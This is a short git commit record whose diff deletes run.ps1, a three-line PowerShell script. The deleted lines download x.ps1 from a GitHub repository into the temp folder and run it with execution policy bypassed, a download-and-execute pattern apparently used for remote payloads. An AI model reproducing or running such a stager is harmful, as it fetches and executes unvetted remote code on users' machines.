19c8d207d90a272253d36ffb7b28719d2eaee81c
halololcloud <halo1313133@gmail.com>
2025-10-19 11:34:46 +0500

    Delete run.ps1

--- run.ps1
+++
@@ -1,3 +0,0 @@
-$temp = Join-Path $env:TEMP "x.ps1"
-Invoke-WebRequest -Uri "https://github.com/halololcloud/images/raw/refs/heads/main/x.ps1" -OutFile $temp -UseBasicParsing
-powershell.exe -ExecutionPolicy Bypass -File $temp
